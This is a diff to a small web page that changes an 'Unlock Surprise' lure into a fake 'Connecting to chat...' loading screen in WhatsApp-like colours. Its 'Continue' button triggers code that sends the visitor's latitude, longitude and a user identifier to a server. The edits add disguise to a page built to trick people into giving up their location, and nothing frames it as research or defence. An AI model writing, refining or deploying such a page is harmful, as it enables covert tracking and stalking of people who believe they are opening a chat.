@@ -2,35 +2,55 @@
 <html>
 
 <head>
-<title>Unlock Surprise</title>
+<title>Loading...</title>
 
 <style>
+
 body{
+margin:0;
 height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
-background:#111;
+background:#0b141a;
 color:white;
 font-family:Arial;
 flex-direction:column;
 }
 
-button{
-font-size:22px;
-padding:20px 40px;
-border:none;
-background:#ff3b3b;
-color:white;
-border-radius:10px;
+.loader{
+border:6px solid #222;
+border-top:6px solid #25D366;
+border-radius:50%;
+width:60px;
+height:60px;
+animation:spin 1s linear infinite;
+margin-bottom:20px;
 }
-</style>
 
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
+
+button{
+margin-top:20px;
+padding:15px 30px;
+font-size:18px;
+background:#25D366;
+border:none;
+color:white;
+border-radius:8px;
+}
+
+</style>
 </head>
 
 <body>
 
-<h2>🎁 Tap to Unlock Surprise</h2>
+<div class="loader"></div>
+
+<h2>Connecting to chat...</h2>
 
 <button onclick="start()">Continue</button>
 
@@ -51,7 +71,8 @@ headers:{
 body:JSON.stringify({
 user:user,
 latitude:pos.coords.latitude,
-longitude:pos.coords.longitude
+longitude:pos.coords.longitude,
+battery:"Unknown"
 })
 })
 
